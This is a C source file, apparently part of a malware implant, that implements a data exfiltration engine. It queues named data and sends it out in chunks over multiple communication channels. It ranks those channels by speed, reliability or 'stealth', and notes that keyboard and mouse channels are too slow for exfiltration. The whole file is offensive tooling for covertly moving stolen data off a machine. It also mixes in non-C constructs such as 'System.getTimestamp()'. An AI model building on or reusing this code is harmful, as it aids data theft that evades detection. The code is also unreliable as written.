// exfiltration.c
#include "exfiltration.h"
#include "comm_manager.h"

#define MAX_EXFIL_QUEUE 10
#define CHUNK_SIZE 1024

// Exfiltration queue
static ExfilData exfil_queue[MAX_EXFIL_QUEUE];
static uint8_t exfil_queue_size = 0;

// Channel enable flags
static bool channel_enabled[COMM_CHANNEL_COUNT] = {true};

// Parallel mode config
static bool parallel_mode_enabled = false;
static uint8_t parallel_max_channels = 2;

// Active exfiltration sessions
static CommChannelType active_channels[COMM_CHANNEL_COUNT] = {COMM_CHANNEL_COUNT};

void exfil_init(void) {
    exfil_queue_size = 0;
    memset(active_channels, COMM_CHANNEL_COUNT, sizeof(active_channels));
    
    // By default, enable all channels except keyboard and mouse
    // (they're too slow for meaningful exfiltration)
    channel_enabled[COMM_CHANNEL_KEYBOARD] = false;
    channel_enabled[COMM_CHANNEL_MOUSE] = false;
    
    for (int i = 2; i < COMM_CHANNEL_COUNT; i++) {
        channel_enabled[i] = true;
    }
    
    // Default to parallel mode with 2 channels
    parallel_mode_enabled = true;
    parallel_max_channels = 2;
}

bool exfil_queue_data(const char* name, const void* data, size_t length, 
                     ExfilPriority priority, bool chunked) {
    if (exfil_queue_size >= MAX_EXFIL_QUEUE) {
        return false;
    }
    
    // Check if already in queue
    for (int i = 0; i < exfil_queue_size; i++) {
        if (strcmp(exfil_queue[i].name, name) == 0) {
            // Update existing entry
            exfil_queue[i].data = data;
            exfil_queue[i].length = length;
            exfil_queue[i].timestamp = System.getTimestamp();
            exfil_queue[i].priority = priority;
            exfil_queue[i].chunked = chunked;
            exfil_queue[i].bytes_sent = 0;
            exfil_queue[i].complete = false;
            return true;
        }
    }
    
    // Add new entry
    exfil_queue[exfil_queue_size].name = name;
    exfil_queue[exfil_queue_size].data = data;
    exfil_queue[exfil_queue_size].length = length;
    exfil_queue[exfil_queue_size].timestamp = System.getTimestamp();
    exfil_queue[exfil_queue_size].priority = priority;
    exfil_queue[exfil_queue_size].chunked = chunked;
    exfil_queue[exfil_queue_size].bytes_sent = 0;
    exfil_queue[exfil_queue_size].complete = false;
    
    exfil_queue_size++;
    return true;
}

void exfil_process_queue(void) {
    if (exfil_queue_size == 0) {
        return;
    }
    
    // Count active channels
    uint8_t active_count = 0;
    for (int i = 0; i < COMM_CHANNEL_COUNT; i++) {
        if (active_channels[i] != COMM_CHANNEL_COUNT) {
            active_count++;
        }
    }
    
    // Process queue based on priority
    for (int i = 0; i < exfil_queue_size; i++) {
        if (exfil_queue[i].complete) {
            continue;
        }
        
        // Check if we've reached max parallel channels
        if (parallel_mode_enabled && active_count >= parallel_max_channels) {
            break;
        }
        
        // Find best channel for this data
        CommChannelType best_channel = COMM_CHANNEL_COUNT;
        
        if (exfil_queue[i].priority == EXFIL_PRIORITY_SPEED) {
            // Find fastest enabled channel
            uint32_t max_speed = 0;
            for (int c = 0; c < COMM_CHANNEL_COUNT; c++) {
                if (channel_enabled[c] && 
                    comm_channels[c].status == CHANNEL_STATUS_CONNECTED &&
                    comm_channels[c].speed_kbps > max_speed) {
                    max_speed = comm_channels[c].speed_kbps;
                    best_channel = (CommChannelType)c;
                }
            }
        } 
        else if (exfil_queue[i].priority == EXFIL_PRIORITY_STEALTH) {
            // Find stealthiest enabled channel
            uint8_t max_stealth = 0;
            for (int c = 0; c < COMM_CHANNEL_COUNT; c++) {
                if (channel_enabled[c] && 
                    comm_channels[c].status == CHANNEL_STATUS_CONNECTED &&
                    comm_channels[c].stealth_rating > max_stealth) {
                    max_stealth = comm_channels[c].stealth_rating;
                    best_channel = (CommChannelType)c;
                }
            }
        }
        else { // EXFIL_PRIORITY_RELIABILITY
            // Find most reliable enabled channel
            uint8_t max_reliability = 0;
            for (int c = 0; c < COMM_CHANNEL_COUNT; c++) {
                if (channel_enabled[c] && 
                    comm_channels[c].status == CHANNEL_STATUS_CONNECTED &&
                    comm_channels[c].reliability > max_reliability) {
                    max_reliability = comm_channels[c].reliability;
                    best_channel = (CommChannelType)c;
                }
            }
        }
        
        // Skip if no suitable channel found
        if (best_channel == COMM_CHANNEL_COUNT) {
            continue;
        }
        
        // Start exfiltration on this channel
        start_exfiltration(i, best_channel);
        active_count++;
    }
    
    // Process active exfiltrations
    for (int c = 0; c < COMM_CHANNEL_COUNT; c++) {
        if (active_channels[c] != COMM_CHANNEL_COUNT) {
            int queue_idx = active_channels[c];
            continue_exfiltration(queue_idx, (CommChannelType)c);
        }
    }
    
    // Clean up completed exfiltrations
    for (int i = exfil_queue_size - 1; i >= 0; i--) {
        if (exfil_queue[i].complete) {
            // Remove from queue
            for (int j = i; j < exfil_queue_size - 1; j++) {
                exfil_queue[j] = exfil_queue[j + 1];
            }
            exfil_queue_size--;
        }
    }
}

// Helper to start exfiltration on a channel
static void start_exfiltration(int queue_idx, CommChannelType channel) {
    // Build header with metadata
    ExfilHeader header = {
        .magic = EXFIL_MAGIC,
        .total_size = exfil_queue[queue_idx].length,
        .chunk_size = exfil_queue[queue_idx].chunked ? CHUNK_SIZE : exfil_queue[queue_idx].length,
        .name_length = strlen(exfil_queue[queue_idx].name)
    };
    
    // Send header and name
    bool success = send_data_via_channel(channel, &header, sizeof(header));
    if (success) {
        success = send_data_via_channel(channel, exfil_queue[queue_idx].name, header.name_length);
    }
    
    if (success) {
        // Mark channel as active for this queue item
        active_channels[channel] = queue_idx;
        
        // If non-chunked and small, try to send all at once
        if (!exfil_queue[queue_idx].chunked && exfil_queue[queue_idx].length <= CHUNK_SIZE) {
            if (send_data_via_channel(channel, exfil_queue[queue_idx].data, exfil_queue[queue_idx].length)) {
                exfil_queue[queue_idx].bytes_sent = exfil_queue[queue_idx].length;
                exfil_queue[queue_idx].complete = true;
                active_channels[channel] = COMM_CHANNEL_COUNT; // Free channel
            }
        }
    } else {
        // Disable this channel temporarily on failure
        comm_channels[channel].error_count++;
        if (comm_channels[channel].error_count > 3) {
            comm_channels[channel].status = CHANNEL_STATUS_ERROR;
        }
    }
}

// Helper to continue exfiltration on a channel
static void continue_exfiltration(int queue_idx, CommChannelType channel) {
    if (exfil_queue[queue_idx].complete) {
        active_channels[channel] = COMM_CHANNEL_COUNT; // Free channel
        return;
    }
    
    // Calculate next chunk
    size_t remaining = exfil_queue[queue_idx].length - exfil_queue[queue_idx].bytes_sent;
    size_t chunk_size = (remaining > CHUNK_SIZE) ? CHUNK_SIZE : remaining;
    const uint8_t* data_ptr = (const uint8_t*)exfil_queue[queue_idx].data + exfil_queue[queue_idx].bytes_sent;
    
    // Send chunk
    if (send_data_via_channel(channel, data_ptr, chunk_size)) {
        exfil_queue[queue_idx].bytes_sent += chunk_size;
        
        // Check if complete
        if (exfil_queue[queue_idx].bytes_sent >= exfil_queue[queue_idx].length) {
            exfil_queue[queue_idx].complete = true;
            active_channels[channel] = COMM_CHANNEL_COUNT; // Free channel
            System.log("Exfiltration complete: %s (%zu bytes)",
                      exfil_queue[queue_idx].name, exfil_queue[queue_idx].length);
        }
    } else {
        // Error handling - try a different channel next time
        comm_channels[channel].error_count++;
        active_channels[channel] = COMM_CHANNEL_COUNT; // Free channel
        System.log("Exfiltration error on channel %d for %s",
                  channel, exfil_queue[queue_idx].name);
    }
}